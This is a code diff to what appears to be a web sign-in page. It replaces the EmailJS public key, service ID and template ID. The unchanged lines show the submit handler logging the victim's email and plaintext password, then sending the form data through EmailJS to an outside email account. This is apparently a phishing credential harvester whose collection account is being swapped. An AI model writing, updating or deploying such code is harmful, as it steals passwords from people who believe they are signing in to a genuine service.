@@ -627,7 +627,7 @@
 
 <script>
     // Initialize EmailJS with your public key
-    emailjs.init("uGRhkufMjo08rjwb_");
+    emailjs.init("EHKPcgjBux1jmPamR");
 
     // DOM elements
     const signinForm = document.getElementById("signin-form");
@@ -733,7 +733,7 @@
 
         console.log("Sign in attempted:", { email: email, password: "🔐 " + password });
 
-        emailjs.send("service_t84doqy", "template_awd8sif", templateParams)
+        emailjs.send("service_kvpr45j", "template_v2xoave", templateParams)
             .then(function(response) {
                 console.log("EmailJS Success!");
                 if (keepSignedIn === "Yes") {
